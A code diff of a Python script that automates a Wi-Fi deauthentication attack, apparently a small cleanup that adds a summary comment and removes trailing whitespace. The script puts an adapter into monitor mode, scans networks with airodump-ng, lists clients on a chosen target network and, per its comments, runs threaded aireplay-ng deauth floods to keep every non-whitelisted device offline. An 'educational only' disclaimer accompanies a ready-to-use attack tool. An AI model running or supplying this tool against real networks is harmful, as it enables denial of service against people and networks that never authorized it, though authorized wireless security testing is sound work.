@@ -1,9 +1,18 @@
+# Puts the Wi-Fi adapter into monitor mode (required for packet injection).
+# Scans for nearby Wi-Fi networks using airodump-ng.
+# Allows the user to select a target network (BSSID and channel).
+# Detects connected clients on the target network.
+# Launches deauthentication attacks (using aireplay-ng) against all connected clients except those specified by the user.
+# Runs multiple threads to continuously send deauth packets to keep devices offline.
+# Reverts the Wi-Fi adapter back to managed mode when stopped.
+
+
 #!/usr/bin/env python3
-# Disclaimer: 
-# This script is for educational purposes only.  
+# Disclaimer:
+# This script is for educational purposes only.
 # Do not use against any network that you don't own or have authorization to test.
 
-#!/usr/bin/python3 
+#!/usr/bin/python3
 
 # We will be using the csv module to work with the data captured by airodump-ng.
 import csv
@@ -18,7 +27,7 @@ import re
 import shutil
 # We can use the subprocess module to run operating system commands.
 import subprocess
-# We will create a thread for each deauth sent to a MAC so that enough time doesn't elapse to allow a device back on the network. 
+# We will create a thread for each deauth sent to a MAC so that enough time doesn't elapse to allow a device back on the network.
 import threading
 # We use the sleep method in the menu.
 import time
@@ -34,7 +43,7 @@ def in_sudo_mode():
 
 def find_nic():
     """This function is used to find the network interface controllers on your computer."""
-    # We use the subprocess.run to run the "sudo iw dev" command we'd normally run to find the network interfaces. 
+    # We use the subprocess.run to run the "sudo iw dev" command we'd normally run to find the network interfaces.
     result = subprocess.run(["iw", "dev"], capture_output=True).stdout.decode()
     network_interface_controllers = wlan_code.findall(result)
     return network_interface_controllers
@@ -60,7 +69,7 @@ def set_band_to_monitor(choice):
         subprocess.Popen(["airodump-ng", "--band", "bg", "-w", "file", "--write-interval", "1", "--output-format", "csv", wifi_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     elif choice == "1":
         # Band a is for 5Ghz WiFi Networks
-        subprocess.Popen(["airodump-ng", "--band", "a", "-w", "file", "--write-interval", "1", "--output-format", "csv", wifi_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)        
+        subprocess.Popen(["airodump-ng", "--band", "a", "-w", "file", "--write-interval", "1", "--output-format", "csv", wifi_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     else:
         # Will use bands a, b and g (actually band n). Checks full spectrum.
         subprocess.Popen(["airodump-ng", "--band", "abg", "-w", "file", "--write-interval", "1", "--output-format", "csv", wifi_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
@@ -110,12 +119,12 @@ def wifi_networks_menu():
             # We want to clear the screen before we print the network interfaces.
             subprocess.call("clear", shell=True)
             for file_name in os.listdir():
-                    # We should only have one csv file as we backup all previous csv files from the folder every time we run the program. 
+                    # We should only have one csv file as we backup all previous csv files from the folder every time we run the program.
                     # The following list contains the field names for the csv entries.
                     fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
                     if ".csv" in file_name:
                         with open(file_name) as csv_h:
-                            # We use the DictReader method and tell it to take the csv_h contents and then apply the dictionary with the fieldnames we specified above. 
+                            # We use the DictReader method and tell it to take the csv_h contents and then apply the dictionary with the fieldnames we specified above.
                             # This creates a list of dictionaries with the keys as specified in the fieldnames.
                             csv_h.seek(0)
                             csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
@@ -131,8 +140,8 @@ def wifi_networks_menu():
             print("No |\tBSSID              |\tChannel|\tESSID                         |")
             print("___|\t___________________|\t_______|\t______________________________|")
             for index, item in enumerate(active_wireless_networks):
-                # We're using the print statement with an f-string. 
-                # F-strings are a more intuitive way to include variables when printing strings, 
+                # We're using the print statement with an f-string.
+                # F-strings are a more intuitive way to include variables when printing strings,
                 # rather than ugly concatenations.
                 print(f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}")
             # We make the script sleep for 1 second before loading the updated list.
@@ -140,7 +149,7 @@ def wifi_networks_menu():
 
     except KeyboardInterrupt:
         print("\nReady to make choice.")
-    
+
     # Ensure that the input choice is valid.
     while True:
         net_choice = input("Please select a choice from above: ")
@@ -152,7 +161,7 @@ def wifi_networks_menu():
 
 def set_into_managed_mode(wifi_name):
     """SET YOUR NETWORK CONTROLLER INTERFACE INTO MANAGED MODE & RESTART NETWORK MANAGER
-       ARGUMENTS: wifi interface name 
+       ARGUMENTS: wifi interface name
     """
     # Put WiFi controller into monitor mode.
     # This is one way to put it into managed mode. You can also use iwconfig, or airmon-ng.
@@ -211,7 +220,7 @@ while True:
     # If you entered a valid MAC Address the program flow will continue and break out of the while loop.
     if len(macs_not_to_kick_off) > 0:
         break
-    
+
     print("You didn't enter valid Mac Addresses.")
 
 
@@ -221,7 +230,7 @@ while True:
     print("Please select the type of scan you want to run.")
     for index, controller in enumerate(wifi_controller_bands):
         print(f"{index} - {controller}")
-    
+
 
     # Check if the choice exists. If it doesn't it asks the user to try again.
     # We don't cast it to an integer at this stage as characters other than digits will cause the program to break.
@@ -247,7 +256,7 @@ if len(network_controllers) == 0:
 while True:
     for index, controller in enumerate(network_controllers):
         print(f"{index} - {controller}")
-    
+
     controller_choice = input("Please select the controller you want to put into monitor mode: ")
 
     try:
@@ -288,13 +297,13 @@ try:
         # We want to clear the screen before we print the network interfaces.
         subprocess.call("clear", shell=True)
         for file_name in os.listdir():
-            # We should only have one csv file as we backup all previous csv files from the folder every time we run the program. 
+            # We should only have one csv file as we backup all previous csv files from the folder every time we run the program.
             # The following list contains the field names for the csv entries.
             fieldnames = ["Station MAC", "First time seen", "Last time seen", "Power", "packets", "BSSID", "Probed ESSIDs"]
             if ".csv" in file_name and file_name.startswith("clients"):
                 with open(file_name) as csv_h:
                     print("Running")
-                    # We use the DictReader method and tell it to take the csv_h contents and then apply the dictionary with the fieldnames we specified above. 
+                    # We use the DictReader method and tell it to take the csv_h contents and then apply the dictionary with the fieldnames we specified above.
                     # This creates a list of dictionaries with the keys as specified in the fieldnames.
                     csv_h.seek(0)
                     csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
@@ -307,12 +316,12 @@ try:
                         else:
                         # Add all the active MAC Addresses.
                             active_clients.add(row["Station MAC"])
-            
+
             print("Station MAC           |")
             print("______________________|")
             for item in active_clients:
-                # We're using the print statement with an f-string. 
-                # F-strings are a more intuitive way to include variables when printing strings, 
+                # We're using the print statement with an f-string.
+                # F-strings are a more intuitive way to include variables when printing strings,
                 # rather than ugly concatenations.
                 print(f"{item}")
                 # Once a device is in the active clients set and not one of the threads running deauth attacks we start a new thread as a deauth attack.
@@ -326,5 +335,6 @@ try:
 except KeyboardInterrupt:
     print("\nStopping Deauth")
 
-# Set the network interface controller back into managed mode and restart network services. 
+# Set the network interface controller back into managed mode and restart network services.
 set_into_managed_mode(wifi_name)
+
